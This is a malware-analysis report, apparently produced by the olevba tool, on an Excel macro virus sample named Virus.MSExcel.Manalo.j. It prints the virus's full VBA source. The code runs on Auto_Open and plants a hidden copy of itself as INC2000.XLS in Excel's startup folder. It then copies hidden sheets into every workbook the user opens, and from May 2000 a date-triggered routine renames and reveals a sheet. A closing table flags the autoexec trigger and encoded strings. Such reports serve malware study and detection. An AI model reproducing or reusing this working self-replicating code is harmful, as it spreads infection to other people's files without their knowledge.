olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSExcel.Manalo.j-83a99689fe491ff50d41ed921bccda135621ed86
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO DNA.bas 
in file: Virus.MSExcel.Manalo.j-83a99689fe491ff50d41ed921bccda135621ed86 - OLE stream: '_VBA_PROJECT_CUR/VBA/DNA'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 


Sub Auto_Open()
Attribute Auto_Open.VB_ProcData.VB_Invoke_Func = " \n14"
        Application.OnSheetActivate = "User"

End Sub

Sub User()
Attribute User.VB_ProcData.VB_Invoke_Func = " \n14"
        
On Error GoTo Finish

date_today = Format(Now, "yyyymmdd")
        
Startup$ = Application.StartupPath
File$ = Dir(Startup$ & "\" & "INC2000.XLS")

If File$ <> "INC2000.XLS" Then GoTo FileDoesNotExist Else GoTo InfectOpenFile

FileDoesNotExist:
            
   Infected$ = ActiveWorkbook.Name
   
   Application.ScreenUpdating = False

   Set newBook = Workbooks.Add
    With newBook
        .Title = ""
        .Subject = ""
    End With
   
   NewWorkbook$ = ActiveWorkbook.Name
   Sheet$ = Workbooks(NewWorkbook$).Sheets(1).Name
        
   If Sheet$ <> "DNA" _
      Then
        Workbooks(Infected$).Sheets("FYM").Copy Before:=Workbooks(NewWorkbook$).Sheets(1)
        Workbooks(Infected$).Sheets("DNA").Copy Before:=Workbooks(NewWorkbook$).Sheets(1)
        Workbooks(NewWorkbook$).Sheets("DNA").Visible = False
        Workbooks(NewWorkbook$).Sheets("FYM").Visible = False
      Else
   End If

   ActiveWindow.Visible = False
      
   Workbooks(NewWorkbook$).SaveAs filename:=Application.StartupPath & "/" & "INC2000.XLS"

GoTo Finish

InfectOpenFile:
        
   filename$ = ActiveWorkbook.Name
   FirstSheet$ = Workbooks(filename$).Sheets(1).Name
        
   Application.ScreenUpdating = False
   
   If FirstSheet$ <> "DNA" _
      Then
        Workbooks("INC2000.XLS").Sheets("DNA").Copy Before:=Workbooks(filename$).Sheets(1)
        Workbooks("INC2000.XLS").Sheets("FYM").Copy After:=Workbooks(filename$).Sheets("DNA")
        
'If (date_today >= "20000510") Then Workbooks(filename$).Sheets("FYM").Name = "FYManalo"
'If (date_today >= "20000510") Then Workbooks("INC2000.XLS").Sheets("FYM").Copy Before:=Workbooks(filename$).Sheets("FYManalo")
        
        
        Workbooks(filename$).Sheets("DNA").Visible = False
        Workbooks(filename$).Sheets("FYM").Visible = False
        
'If (date_today >= "20000510") Then Workbooks(filename$).Sheets("FYManalo").Visible = True
        
Else
If (date_today >= "20000510") Then Workbooks(filename$).Sheets("FYM").Name = "FYManalo"
If (date_today >= "20000510") Then Workbooks("INC2000.XLS").Sheets("FYM").Copy Before:=Workbooks(filename$).Sheets("FYManalo")
If (date_today >= "20000510") Then Workbooks(filename$).Sheets("FYManalo").Visible = True
If (date_today >= "20000510") Then Workbooks(filename$).Sheets("FYM").Visible = False

End If

Finish:
Application.OnSheetActivate = ""
Application.ScreenUpdating = True
Application.OnSheetActivate = "INC2000.XLS!User"

End Sub

-------------------------------------------------------------------------------
VBA MACRO Sheet14.cls 
in file: Virus.MSExcel.Manalo.j-83a99689fe491ff50d41ed921bccda135621ed86 - OLE stream: '_VBA_PROJECT_CUR/VBA/Sheet14'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO xlm_macro.txt 
in file: xlm_macro - OLE stream: 'xlm_macro'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' 0085     11 BOUNDSHEET : Sheet Information - Visual Basic module, visible -  DN
' 0085     11 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, hidden -  FY
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Auto_Open           |Runs when the Excel Workbook is opened       |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

